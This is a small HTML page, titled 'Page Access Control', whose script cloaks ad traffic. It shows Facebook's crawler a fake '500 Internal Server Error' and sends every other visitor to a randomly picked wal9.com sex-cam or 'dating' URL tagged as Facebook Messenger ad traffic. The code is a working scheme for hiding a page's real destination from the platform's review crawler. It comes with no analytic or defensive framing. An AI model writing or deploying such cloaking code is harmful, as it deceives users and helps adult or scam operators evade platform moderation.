<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page Access Control</title>
    <script>
        window.onload = function() {
            // Check the user agent
            const userAgent = navigator.userAgent;

            // Simulate checking for Facebook's crawler
            if (userAgent.includes('facebookexternalhit')) {
                // Simulate sending a 500 error response
                document.body.innerHTML = "<h1>500 Internal Server Error</h1>";
                return; // Stop further execution
            }

            // Otherwise, redirect to a random page
            const pages = [
                "https://wal9.com/whatsapp?utm_source=facebook&utm_medium=cpc&utm_campaign=messenger&utm_id=facebook&utm_term=xxx_videos&utm_content=Sex_cam",
                "https://wal9.com/call?utm_source=facebook&utm_medium=cpc&utm_campaign=messenger&utm_id=facebook&utm_term=xxx_videos&utm_content=live_cam",
                "https://wal9.com/call/index.php?utm_source=facebook&utm_medium=cpc&utm_campaign=messenger&utm_id=facebook&utm_term=xxx_videos&utm_content=live_dating_cam",
                "https://wal9.com/whatsapp/index.php?utm_source=facebook&utm_medium=cpc&utm_campaign=messenger&utm_id=facebook&utm_term=sex_videos&utm_content=dating"
            ];
            const randomPage = pages[Math.floor(Math.random() * pages.length)];
            window.location.href = randomPage;
        };
    </script>
</head>
<body>
</body>
</html>